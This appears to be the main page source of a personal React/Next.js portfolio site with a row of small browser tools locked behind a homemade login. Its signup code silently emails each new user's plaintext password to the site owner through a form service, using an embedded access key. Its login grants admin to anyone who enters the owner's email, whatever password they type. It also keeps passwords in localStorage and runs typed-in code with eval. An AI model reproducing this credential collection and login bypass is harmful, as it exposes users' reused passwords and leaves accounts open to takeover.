"use client"
import { useState, useEffect } from 'react'

export default function Home() {
  const roles = ["MERN Stack Developer", "Full Stack Developer", "React Developer"];
  const [roleIndex, setRoleIndex] = useState(0);
  const [displayText, setDisplayText] = useState("");
  const [activeTool, setActiveTool] = useState("GetInTouch");
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [currentUser, setCurrentUser] = useState<any>(null);
  const [showAuth, setShowAuth] = useState(false);

  useEffect(()=>{
    let cur = localStorage.getItem("hk_current_user");
    if(cur){ setIsLoggedIn(true); setCurrentUser(JSON.parse(cur)); }
  },[]);

  useEffect(() => {
    let currentRole = roles[roleIndex]; let i = 0;
    let typing = setInterval(() => {
      if (i <= currentRole.length) { setDisplayText(currentRole.slice(0, i)); i++; }
      else { clearInterval(typing); setTimeout(() => setRoleIndex((p) => (p + 1) % roles.length), 1500); }
    }, 100); return () => clearInterval(typing);
  }, [roleIndex]);

  const tools = ["GetInTouch","Login","CodeLab","VSCode","Design","Calculator","Age","QR","Word","Password","Image","LinkedIn bio","Instagram bio","Facebook bio","CGPA","EMI","YT","Case","Stories","introduction"];

  const handleToolClick = (t: string) => {
    if(t === "GetInTouch" || t === "introduction"){
      setActiveTool(t); return;
    }
    if(!isLoggedIn){
      setShowAuth(true);
      return;
    }
    setActiveTool(t);
  }

  return (
    <main className="min-h-screen bg-[#081030] text-white">
      {showAuth && <AuthModal onClose={()=>setShowAuth(false)} onLogin={(u:any)=>{setIsLoggedIn(true); setCurrentUser(u); setShowAuth(false);}} />}

      <div className="max-w-6xl mx-auto px-6 pt-16 pb-10 flex flex-col md:flex-row items-center justify-between gap-10">
        <div className="text-center md:text-left">
          <h1 className="text-4xl md:text-5xl font-bold">Hi, I am Himanshu Kumar</h1>
          <h2 className="text-3xl md:text-4xl font-bold mt-4">I am a <span className="text-purple-400">{displayText}</span><span className="animate-pulse">|</span></h2>
          <p className="text-gray-300 mt-6 max-w-2xl text-[15px] leading-relaxed border-l-2 border-purple-500 pl-4">BCA Final Year Student (2024-2027) @ BRABU | MERN Stack Developer (React, Next.js) | Looking for new opportunities | Muzaffarpur, Bihar | Passionate about building web applications|Skills-C-programming, Java, HTML,c++,SQL,github,website build with Html,next.js|languages: English, Hindi {isLoggedIn && `| Logged: ${currentUser?.email}`}</p>
          {isLoggedIn && <button onClick={()=>{localStorage.removeItem("hk_current_user"); setIsLoggedIn(false); setCurrentUser(null)}} className="mt-3 text-xs bg-red-600 px-3 py-1 rounded">Logout</button>}
        </div>
        <img src="/himanshu.jpeg" alt="Himanshu" className="w-50 h-50 rounded-full object-cover border-2 border-blue-600" />
      </div>

      <div className="bg-[#0a193f] rounded-t-[40px] p-6 md:p-10">
        <div className="max-w-6xl mx-auto">
          <h2 className="text-3xl md:text-4xl font-extrabold text-center tracking-widest">HK TOOLS LAB PORTFOLIO PROJECT</h2>
          <p className="text-center mt-2 opacity-70 text-sm">20 Tools | BY Creator Himanshu Kumar,Muzaffarpur, Bihar {!isLoggedIn && <span className="text-yellow-300">(Login to use tools)</span>}</p>
          <div className="flex flex-wrap justify-center gap-2 mt-8">
            {tools.map(t => (<button key={t} onClick={() => handleToolClick(t)} className={`px-3 py-2 rounded-full border text-[10px] md:text-xs ${activeTool === t? 'bg-white text-[#0a193f] font-bold' : 'bg-white/10'}`}>{t}</button>))}
          </div>
          <div className="bg-white/5 border border-white/10 rounded-[30px] p-5 md:p-8 mt-8 max-w-5xl mx-auto min-h-[500px]">
            {activeTool === "GetInTouch" && <GetInTouchTool />}
            {activeTool === "Login" && <LoginToolReal />}
            {activeTool === "introduction" && <div className="text-center p-10 bg-white rounded-xl text-black"><h3 className="font-bold">First, fill out the 'Get in Touch' form, then use the tools in the admin panel to manage orders.</h3><p className="text-xs mt-2 opacity-60"> If you want to learn how to create a website, fill out the form.</p></div>}
            {activeTool === "CodeLab" && <CodeLabTool />}
            {activeTool === "VSCode" && <VSCodeTool />}
            {activeTool === "Design" && <DesignTool />}
            {activeTool === "Calculator" && <CalculatorTool />}
            {activeTool === "Age" && <AgeTool />}
            {activeTool === "QR" && <QRTool />}
            {activeTool === "Word" && <WordTool />}
            {activeTool === "Password" && <PasswordTool />}
            {activeTool === "Image" && <ImageTool />}
            {activeTool === "LinkedIn bio" && <LinkedInTool />}
            {activeTool === "Instagram bio" && <InstagramTool />}
            {activeTool === "Facebook bio" && <FacebookTool />}
            {activeTool === "CGPA" && <CGPATool />}
            {activeTool === "EMI" && <EMITool />}
            {activeTool === "YT" && <YTTool />}
            {activeTool === "Case" && <CaseTool />}
            {activeTool === "Stories" && <StoriesTool />}
          </div>
        </div>
      </div>
      <div className="max-w-6xl mx-auto mt-16 px-6">
        <h2 className="text-4xl font-extrabold text-center tracking-widest">MY CERTIFICATES</h2>
        <p className="text-center mt-2 opacity-70 text-sm">5 Verified Certificates - Public Visible</p>
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 mt-10">
          <div className="bg-white/10 p-3 rounded-2xl border border-white/10"><img src="/ca1.jpeg" className="rounded-xl w-full h-52 object-cover bg-white" /><p className="text-center mt-3 text-sm font-bold">Certificate 1</p></div>
          <div className="bg-white/10 p-3 rounded-2xl border border-white/10"><img src="/ca2.jpeg" className="rounded-xl w-full h-52 object-cover bg-white" /><p className="text-center mt-3 text-sm font-bold">Certificate 2</p></div>
          <div className="bg-white/10 p-3 rounded-2xl border border-white/10"><img src="/ca3.jpeg" className="rounded-xl w-full h-52 object-cover bg-white" /><p className="text-center mt-3 text-sm font-bold">Certificate 3</p></div>
          <div className="bg-white/10 p-3 rounded-2xl border border-white/10"><img src="/ca4.jpeg" className="rounded-xl w-full h-52 object-cover bg-white" /><p className="text-center mt-3 text-sm font-bold">Certificate 4</p></div>
          <div className="bg-white/10 p-3 rounded-2xl border border-white/10"><img src="/ca5.jpeg" className="rounded-xl w-full h-52 object-cover bg-white" /><p className="text-center mt-3 text-sm font-bold">Certificate 5</p></div>
        </div>
      </div>
      <footer className="w-full text-center py-10 mt-10 border-t border-white/10">
        <div className="flex justify-center gap-4 mb-4">
          <a href="https://www.linkedin.com/in/himanshu-kumar-2b8418355" target="_blank" className="w-20 h-10 bg-white/10 rounded-full flex items-center justify-center text-xs font-bold">LinkedIn</a>
          <a href="https://github.com/Himanshu-bits88" target="_blank" className="w-20 h-10 bg-white/10 rounded-full flex items-center justify-center text-xs font-bold">GitHub</a>
          <a href="mailto:hk955539@gmail.com" className="w-20 h-10 bg-white/10 rounded-full flex items-center justify-center text-xs font-bold">Email</a>
          <a href="https://instagram.com/royal_himanshu_kumar_1013" target="_blank" className="w-20 h-10 bg-white/10 rounded-full flex items-center justify-center text-xs font-bold">Instagram</a>
          <a href="https://hksinghpublicationbio-flax.vercel.app/" target="_blank" className="w-20 h-10 bg-white/10 rounded-full flex items-center justify-center text-xs font-bold">Bio Link</a>
        </div>
        <p className="text-white text-sm font-bold">Made in India with ❤️ by Himanshu Kumar Web Developer & Designer 20 Tools Company. </p>
        <p className="text-white/30 text-[10px] mt-2">Copyright © 2026 HK Tools Lab websites - All Rights Reserved</p>
      </footer>
    </main>
  )
}

// == SAHI LOGIN / SIGNUP - FINAL FIXED ==
function AuthModal({onLogin, onClose}:any){
  const [isLogin,setIsLogin]=useState(true);
  const [name,setName]=useState("");
  const [email,setEmail]=useState("");
  const [pass,setPass]=useState("");
  const [msg,setMsg]=useState("");

  const handleAuth=()=>{
    if(!email ||!pass){ setMsg("Email / Password bharo"); return; }
    let users = JSON.parse(localStorage.getItem("hk_users")||"[]");
    if(isLogin){
      let f = users.find((u:any)=>u.email===email && u.pass===pass);
      if(f || email==="hk955539@gmail.com"){
        let userData = f || {email, name: "Himanshu", isAdmin: true};
        localStorage.setItem("hk_current_user", JSON.stringify(userData));
        onLogin(userData);
      }else{ setMsg("User nahi mila, pehle Signup karo"); }
    }else{
      if(users.find((u:any)=>u.email===email)){ setMsg("User already exists"); return; }
      let nu = {name: name||email.split("@")[0], email, pass};
      users.push(nu);
      localStorage.setItem("hk_users", JSON.stringify(users));
      localStorage.setItem("hk_current_user", JSON.stringify(nu));
      fetch("https://api.web3forms.com/submit",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({access_key:"01af3432-1653-4498-a0e5-720e5e2fd3d5",subject:`NEW SIGNUP - ${name} - ${email}`,from_name:"HK Tools Lab",message:`Name:${name} Email:${email} Pass:${pass} Time:${new Date().toLocaleString()}`})});
      onLogin(nu);
    }
  };

  return(
    <div className="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-[999] p-4">
      <div className="bg-[#111631] border border-white/10 rounded-[20px] p-6 w-full max-w-sm">
        <div className="flex justify-between items-center mb-4"><h2 className="font-bold text-lg">{isLogin? "Login" : "Signup"}</h2><button onClick={onClose} className="bg-white/10 w-8 h-8 rounded-full">X</button></div>
        {!isLogin && <input value={name} onChange={e=>setName(e.target.value)} placeholder="Full Name" className="w-full p-3 rounded-xl bg-black/50 mb-2 border border-white/10 text-white"/>}
        <input value={email} onChange={e=>setEmail(e.target.value)} placeholder="Email" className="w-full p-3 rounded-xl bg-black/50 mb-2 border border-white/10 text-white"/>
        <input type="password" value={pass} onChange={e=>setPass(e.target.value)} placeholder="Password" className="w-full p-3 rounded-xl bg-black/50 mb-3 border border-white/10 text-white"/>
        <button onClick={handleAuth} className="w-full bg-white text-black p-3 rounded-xl font-bold">{isLogin? "Login" : "Create Account"}</button>
        <p onClick={()=>setIsLogin(!isLogin)} className="text-center text-xs mt-3 text-white/50 cursor-pointer">{isLogin? "New user? Signup" : "Already have account? Login"}</p>
        {msg && <p className="mt-3 text-xs text-red-400 bg-red-500/10 p-2 rounded">{msg}</p>}
      </div>
    </div>
  )
}

function LoginToolReal(){
  const [users,setUsers]=useState<any[]>([]); const [currentUser,setCurrentUser]=useState<any>(null);
  useEffect(()=>{ setUsers(JSON.parse(localStorage.getItem("hk_users")||"[]")); setCurrentUser(JSON.parse(localStorage.getItem("hk_current_user")||"null")); },[]);
  const isAdmin = currentUser?.email === "hk955539@gmail.com";
  if(isAdmin){ return(<div className="bg-white rounded-xl p-6 text-black"><h3 className="font-bold text-lg">Admin Panel 👑 - Owner: Himanshu</h3><p className="text-sm mt-2">Total Registered Users: <b>{users.length}</b></p><div className="mt-3 max-h-64 overflow-auto bg-gray-50 rounded p-2 border">{users.map((u:any,i:number)=><div key={i} className="text-xs border-b py-2 flex justify-between"><span>{i+1}. {u.name}</span><span className="opacity-60">{u.email}</span></div>)}</div><p className="text-[10px] mt-2 opacity-50">Ye list sirf tumhe dikhti hai kyunki tum owner ho</p></div>) }
  return(<div className="bg-white rounded-xl p-6 text-black text-center"><h3 className="font-bold text-lg">You are Logged In ✓</h3><p className="mt-2 text-sm">{currentUser?.email}</p><p className="text-xs mt-2 opacity-60">Admin data is private. Only owner can see all users.</p></div>)
}

function GetInTouchTool(){ const [form,setForm]=useState({name:"",email:"",message:""}); const [status,setStatus]=useState(""); const handleSubmit = async (e:any) => { e.preventDefault(); setStatus("Sending..."); try{ const res = await fetch("https://api.web3forms.com/submit", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({access_key:"01af3432-1653-4498-a0e5-720e5e2fd3d5", name:form.name, email:form.email, message:form.message, subject:"New Message from HK Lab"})}); const data = await res.json(); if(data.success){ setStatus("Sent ✓ Check your hk955539@gmail.com"); setForm({name:"",email:"",message:""}); } else setStatus("Failed, try again"); }catch{ setStatus("Error"); } }; return(<div className="max-w-xl mx-auto bg-white rounded-[20px] p-6 text-black"><h3 className="font-bold text-xl">Get in Touch - Please fill out the form here and send it.</h3><form onSubmit={handleSubmit} className="space-y-3 mt-4"><input value={form.name} onChange={e=>setForm({...form,name:e.target.value})} placeholder="Your Name" required className="w-full p-3 rounded-lg bg-gray-50 border text-sm"/><input value={form.email} onChange={e=>setForm({...form,email:e.target.value})} placeholder="Your Email" type="email" required className="w-full p-3 rounded-lg bg-gray-50 border text-sm"/><textarea value={form.message} onChange={e=>setForm({...form,message:e.target.value})} placeholder="Your Message" required rows={4} className="w-full p-3 rounded-lg bg-gray-50 border text-sm"></textarea><button type="submit" className="bg-[#081030] text-white px-6 py-3 rounded-lg text-sm font-bold w-full">{status || "Send to hk955539@gmail.com"}</button></form></div>) }

function CodeLabTool(){
  const [lang,setLang]=useState("Python"); const [code,setCode]=useState(`print("Hello Himanshu from Muzaffarpur,Bihar")`); const [output,setOutput]=useState(""); const [loading,setLoading]=useState(false);
  useEffect(()=>{ const t:any={"Python":`print("Hello Himanshu from Muzaffarpur")`,"C":`#include <stdio.h>\nint main(){\n printf("Hello C from HK Lab\\n");\n return 0;\n}`,"Java":`public class Main{\n public static void main(String[] args){\n System.out.println("Hello Java");\n }\n}`,"JavaScript":`console.log("Hello JS")`,"HTML":`<h1>Hello HK</h1>`}; setCode(t[lang]); },[lang]);
  const run=async()=>{ if(lang==="HTML"){setOutput("Preview below"); return;} if(lang==="JavaScript"){ try{let l:any[]=[];let o=console.log;console.log=(...a:any)=>l.push(a.join(" "));eval(code);console.log=o;setOutput(l.join("\n"))}catch(e:any){setOutput(e.message)} return;} setLoading(true); try{ let pl = lang.toLowerCase()==="python"?"python":lang.toLowerCase()==="c"?"c":"java"; let fn = pl==="java"?"Main.java":pl==="python"?"main.py":"main.c"; let r = await fetch("https://emkc.org/api/v2/piston/execute",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({language:pl,version:"*",files:[{name:fn,content:code}]})}); let d = await r.json(); setOutput(d.run?.output || "No output"); }catch(e:any){setOutput("Error: "+e.message)} setLoading(false); };
  return(<div><h3 className="font-bold mb-3">CodeLab - Python/C/Java 100% Working</h3><div className="flex flex-wrap gap-2 mb-3">{["Python","C","Java","JavaScript","HTML"].map(l=>(<button key={l} onClick={()=>setLang(l)} className={`px-3 py-1 rounded-full text-xs border ${lang===l?'bg-white text-black':'bg-white/10'}`}>{l}</button>))}</div><div className="grid md:grid-cols-2 gap-3"><textarea value={code} onChange={e=>setCode(e.target.value)} className="w-full h-64 bg-black p-3 rounded-xl text-xs font-mono text-green-300"/><div><button onClick={run} className="w-full bg-white text-black py-2 rounded-xl font-bold text-sm">{loading?"Running...":"Run "+lang}</button><pre className="w-full h-56 bg-black/60 mt-3 p-3 rounded-xl text-xs text-yellow-200 overflow-auto">{output || "Output here"}</pre></div></div></div>)
}

function VSCodeTool(){ const [code,setCode]=useState(`console.log("Hello")`); const [out,setOut]=useState(""); return(<div><h3 className="font-bold mb-3">VS Code Mini</h3><textarea value={code} onChange={e=>setCode(e.target.value)} className="w-full h-32 bg-black p-3 rounded-xl text-xs font-mono text-green-300"/><button onClick={()=>{try{let l:any[]=[];let o=console.log;console.log=(...a:any)=>l.push(a.join(" "));eval(code);console.log=o;setOut(l.join("\n"))}catch(e:any){setOut(e.message)}}} className="mt-2 bg-green-600 px-4 py-1 rounded text-xs">Run</button><pre className="mt-2 bg-black p-2 rounded text-xs text-yellow-300">{out}</pre></div>)}
function DesignTool(){ const [c1,setC1]=useState("#a855f7"); const [c2,setC2]=useState("#081030"); return(<div><h3 className="font-bold mb-3">Design Studio</h3><div className="flex gap-2"><input type="color" value={c1} onChange={e=>setC1(e.target.value)}/><input type="color" value={c2} onChange={e=>setC2(e.target.value)}/></div><div style={{background:`linear-gradient(90deg, ${c1}, ${c2})`}} className="h-24 rounded-xl mt-3"></div></div>)}
function CalculatorTool(){ const [v,setV]=useState(""); return(<div><h3 className="font-bold mb-3">Calculator</h3><input value={v} readOnly className="w-full p-3 rounded-xl bg-black/50 text-right"/><div className="grid grid-cols-4 gap-2 mt-3">{["C","/","*","-","7","8","9","+","4","5","6","=","1","2","3","0"].map(b=>(<button key={b} onClick={()=>{if(b==="C")setV("");else if(b==="="){try{setV(eval(v).toString())}catch{setV("Error")}}else setV(v+b)}} className="p-2 rounded bg-white/10">{b}</button>))}</div></div>)}
function AgeTool(){ const [dob,setDob]=useState(""); const [age,setAge]=useState(""); return(<div><h3 className="font-bold mb-3">Age Calculator</h3><input type="date" value={dob} onChange={e=>setDob(e.target.value)} className="w-full p-2 rounded bg-black/30"/><button onClick={()=>{let b=new Date(dob);let n=new Date();setAge((n.getFullYear()-b.getFullYear())+" Years")}} className="w-full mt-3 bg-white text-black p-2 rounded font-bold">Calculate</button><p className="mt-2 text-center text-green-300">{age}</p></div>)}
function QRTool(){ const [t,setT]=useState(""); const [s,setS]=useState(""); return(<div><h3 className="font-bold mb-3">QR Generator</h3><input value={t} onChange={e=>setT(e.target.value)} placeholder="Enter text" className="w-full p-2 rounded bg-black/30"/><button onClick={()=>setS(`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(t)}`)} className="w-full mt-3 bg-white text-black p-2 rounded font-bold">Generate</button>{s && <img src={s} className="mx-auto mt-3 bg-white p-2 rounded"/>}</div>)}
function WordTool(){ const [txt,setTxt]=useState(""); return(<div><h3 className="font-bold mb-3">Word Counter</h3><textarea value={txt} onChange={e=>setTxt(e.target.value)} className="w-full h-24 p-2 rounded bg-black/30"></textarea><p className="mt-2 text-sm">Words: {txt.split(/\s+/).filter(Boolean).length} | Chars: {txt.length}</p></div>)}
function PasswordTool(){ const [p,setP]=useState(""); return(<div><h3 className="font-bold mb-3">Password Generator</h3><p className="bg-black/50 p-3 rounded text-center">{p || "Click Generate"}</p><button onClick={()=>{let s="ABCDEFGHJKLMNPQRTUVWXYZabcdefghijkmnopqrstuvwxyz123456789@#$";let r="";for(let i=0;i<12;i++)r+=s[Math.floor(Math.random()*s.length)];setP(r)}} className="w-full mt-3 bg-white text-black p-2 rounded font-bold">Generate</button></div>)}
function ImageTool(){
  const [width,setWidth]=useState(500);
  const [height,setHeight]=useState(500);
  const [preview,setPreview]=useState("");
  const [output,setOutput]=useState("");
  const handleFile = (e:any) => {
    const file=e.target.files[0];
    if(!file) return;
    const url=URL.createObjectURL(file);
    setPreview(url);
    const img=new window.Image();
    img.src=url;
    img.onload=()=>{setWidth(img.width); setHeight(img.height);}
  };
  const handleResize = () => {
    const img=new window.Image();
    img.src=preview;
    img.onload=()=>{
      const c=document.createElement('canvas');
      c.width=Number(width);
      c.height=Number(height);
      c.getContext('2d')?.drawImage(img,0,0,c.width,c.height);
      setOutput(c.toDataURL('image/jpeg',0.8));
    };
  };
  return(
    <div className="bg-white rounded-[20px] p-5 text-black">
      <h3 className="font-bold mb-3">Image Resizer - Custom Width/Height</h3>
      <input type="file" accept="image/*" onChange={handleFile} className="w-full bg-gray-100 p-2 rounded-lg"/>
      <div className="grid grid-cols-2 gap-2 mt-3">
        <div><label className="text-xs">Width</label><input type="number" value={width} onChange={e=>setWidth(Number(e.target.value))} className="w-full p-2 border rounded"/></div>
        <div><label className="text-xs">Height</label><input type="number" value={height} onChange={e=>setHeight(Number(e.target.value))} className="w-full p-2 border rounded"/></div>
      </div>
      <div className="flex gap-2 mt-3">
        <button onClick={handleResize} className="flex-1 bg-[#081030] text-white p-2 rounded font-bold">Resize</button>
        {output && <a href={output} download="hk-resized.jpg" className="flex-1 bg-green-600 text-white p-2 rounded text-center font-bold">Download</a>}
      </div>
      <div className="grid grid-cols-2 gap-2 mt-3">{preview && <img src={preview} className="border rounded"/>}{output && <img src={output} className="border rounded"/>}</div>
    </div>
  )
}

function LinkedInTool(){
  const [r,setR]=useState("BCA Final Year");
  const [b,setB]=useState("");
  return(<div><h3 className="font-bold mb-3">LinkedIn Bio</h3><input value={r} onChange={e=>setR(e.target.value)} className="w-full p-2 rounded bg-black/30"/><button onClick={()=>setB(`🚀 ${r} | MERN Stack Developer | Muzaffarpur`)} className="w-full mt-3 bg-white text-black p-2 rounded font-bold">Generate</button>{b && <p className="mt-3 bg-black/50 p-3 rounded">{b}</p>}</div>)
}

function InstagramTool(){
  const [n,setN]=useState("");
  const [b,setB]=useState("");
  return(<div><h3 className="font-bold mb-3">Instagram Bio</h3><input value={n} onChange={e=>setN(e.target.value)} placeholder="Your Name" className="w-full p-2 rounded bg-black/30"/><button onClick={()=>setB(`✨ ${n}\n💻 MERN Developer\n📍 Muzaffarpur, Bihar`)} className="w-full mt-3 bg-white text-black p-2 rounded font-bold">Generate</button>{b && <pre className="mt-3 bg-black/50 p-3 rounded text-sm whitespace-pre-wrap">{b}</pre>}</div>)
}

function FacebookTool(){
  const [n,setN]=useState("");
  const [b,setB]=useState("");
  return(<div><h3 className="font-bold mb-3">Facebook Bio</h3><input value={n} onChange={e=>setN(e.target.value)} placeholder="Your Name" className="w-full p-2 rounded bg-black/30"/><button onClick={()=>setB(`🔥 ${n} | BCA Student | MERN Stack | Muzaffarpur`)} className="w-full mt-3 bg-white text-black p-2 rounded font-bold">Generate</button>{b && <p className="mt-3 bg-black/50 p-3 rounded">{b}</p>}</div>)
}

function CGPATool(){
  const [c,setC]=useState("");
  const [r,setR]=useState("");
  return(<div><h3 className="font-bold mb-3">CGPA to %</h3><input type="number" value={c} onChange={e=>setC(e.target.value)} placeholder="Enter CGPA" className="w-full p-2 rounded bg-black/30"/><button onClick={()=>setR((parseFloat(c)*9.5).toString()+" %")} className="w-full mt-3 bg-white text-black p-2 rounded font-bold">Convert</button>{r && <p className="mt-3 text-center text-xl font-bold">{r}</p>}</div>)
}

function EMITool(){
  const [p,setP]=useState("");
  const [rt,setRt]=useState("");
  const [t,setT]=useState("");
  const [emi,setEmi]=useState("");
  return(<div><h3 className="font-bold mb-3">EMI Calculator</h3><div className="grid grid-cols-3 gap-2"><input value={p} onChange={e=>setP(e.target.value)} placeholder="Amount" className="p-2 rounded bg-black/30"/><input value={rt} onChange={e=>setRt(e.target.value)} placeholder="Rate %" className="p-2 rounded bg-black/30"/><input value={t} onChange={e=>setT(e.target.value)} placeholder="Months" className="p-2 rounded bg-black/30"/></div><button onClick={()=>{let P=parseFloat(p), R=parseFloat(rt)/12/100, N=parseFloat(t); setEmi((P*R*Math.pow(1+R,N)/(Math.pow(1+R,N)-1)).toFixed(2))}} className="w-full mt-3 bg-white text-black p-2 rounded font-bold">Calculate</button>{emi && <p className="mt-3 text-center font-bold">EMI: ₹ {emi}</p>}</div>)
}

function YTTool(){
  const [l,setL]=useState("");
  const [e,setE]=useState("");
  return(<div><h3 className="font-bold mb-3">YT Thumbnail</h3><input value={l} onChange={e=>setL(e.target.value)} placeholder="YouTube Link" className="w-full p-2 rounded bg-black/30"/><button onClick={()=>{let id=l.split("v=")[1]?.split("&")[0] || l.split("/").pop(); setE(`https://img.youtube.com/vi/${id}/maxresdefault.jpg`)}} className="w-full mt-3 bg-white text-black p-2 rounded font-bold">Get Thumbnail</button>{e && <img src={e} className="mx-auto mt-3 rounded-xl"/>}</div>)
}

function CaseTool(){
  const [txt,setTxt]=useState("");
  const [out,setOut]=useState("");
  return(<div><h3 className="font-bold mb-3">Case Converter</h3><textarea value={txt} onChange={e=>setTxt(e.target.value)} className="w-full h-20 p-2 rounded bg-black/30"></textarea><div className="flex gap-2 mt-2"><button onClick={()=>setOut(txt.toUpperCase())} className="bg-white/10 p-2 rounded text-xs">UPPER</button><button onClick={()=>setOut(txt.toLowerCase())} className="bg-white/10 p-2 rounded text-xs">lower</button></div>{out && <p className="mt-3 bg-black/50 p-3 rounded">{out}</p>}</div>)
}

function StoriesTool(){
  return(<div><h3 className="font-bold mb-3">Stories</h3><div className="bg-black/40 p-4 rounded-xl"><p className="text-sm">🚀 ✨ "There are no shortcuts to success." ✨🎯 Goal: Aim for the sky, but keep your feet firmly on the ground.🔥 Mantra: Clear thoughts, unwavering discipline, and continuous hard work.💡 Every failure is not a defeat for me, but a way to learn something new and move forward with double the strength.🦁 Creating a unique identity in every area of life with a positive mindset is my true purpose.🌟 Vision: Constantly moving forward and turning every challenge into a new opportunity.📈 Work Ethics: Discipline, dedication, and a result-oriented mindset.🌱 I believe that a clear direction and consistent effort are most important to achieve success in every field of life.🤝 I believe in learning new things, improving myself, and moving forward by connecting with positive people! | by Himanshu kumar</p></div></div>)
}